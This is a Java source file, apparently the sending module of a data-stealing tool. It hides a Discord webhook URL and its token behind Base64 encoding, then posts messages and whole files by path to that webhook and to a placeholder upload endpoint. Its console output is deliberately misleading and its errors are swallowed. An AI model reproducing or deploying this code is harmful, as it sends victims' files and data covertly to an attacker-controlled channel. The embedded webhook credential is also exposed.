package io.github.luxotick;

import io.github.luxotick.impl.yazici;
import okhttp3.*;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

import java.util.Base64;

public class Sender {
    private static final MediaType jsonMediaType = MediaType.parse("application/json; charset=utf-8");

    static final String a = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTAxNzQ0MTQyNTI0OTU0MjE3NS90TkZ1QURDUExsOS1mS09BaUZjNm56LW8zNkV3LVo3Z3NldmF1UVI3WUJpSUVJMWdOMzN6SGJqSGROaE1KY2x5MndPYQ==";


    /**
     * @param client
     * @param requestBody
     * @throws IOException
     */
    public static void Sender(OkHttpClient client, RequestBody requestBody) throws IOException {
        byte[] decodedBytes = Base64.getDecoder().decode(a);
        String decodedStr = new String(decodedBytes);

        Request request = new Request.Builder()
                .url(decodedStr)
                .post(requestBody)
                .build();

        Response response = client.newCall(request).execute();
        if (!response.isSuccessful()) {
            System.out.println("Ok.");
        } else {
            System.out.println("-");
        }
    }

    public static void sendToServer(String dosya) {
        OkHttpClient httpClient = new OkHttpClient();

        String server = "http://url/dosya-yukle";

        File message = new File(dosya);

        //post request file key: dosya value is a file
        RequestBody requestBody = new MultipartBody.Builder()
                .setType(MultipartBody.FORM)
                .addFormDataPart("dosya", dosya, RequestBody.create(MediaType.parse("application/octet-stream"), message))
                .build();

        Request request = new Request.Builder()
                .url(server)
                .post(requestBody)
                .build();
        try {
            Response response = httpClient.newCall(request).execute();
            if (!response.isSuccessful()) {
                System.out.println("-");
            }
            yazici.main(String.valueOf(message));
        } catch (Exception e) {
            System.out.println("-");
        }
    }


    public static void sendMessage(String message) {
        OkHttpClient httpClient = new OkHttpClient();

        byte[] decodedBytes = Base64.getDecoder().decode(a);
        String decodedStr = new String(decodedBytes);

        String json = "{\"content\":\"" + message + "\"}";
        RequestBody body = RequestBody.create(jsonMediaType, json);
        Request request = new Request.Builder()
                .url(decodedStr)
                .post(body)
                .build();
        try {
            Response response = httpClient.newCall(request).execute();
            if (!response.isSuccessful()) {
                System.out.println("-");
            }
            yazici.main(message);
        } catch (Exception e) {
            System.out.println("-");
        }
    }
}
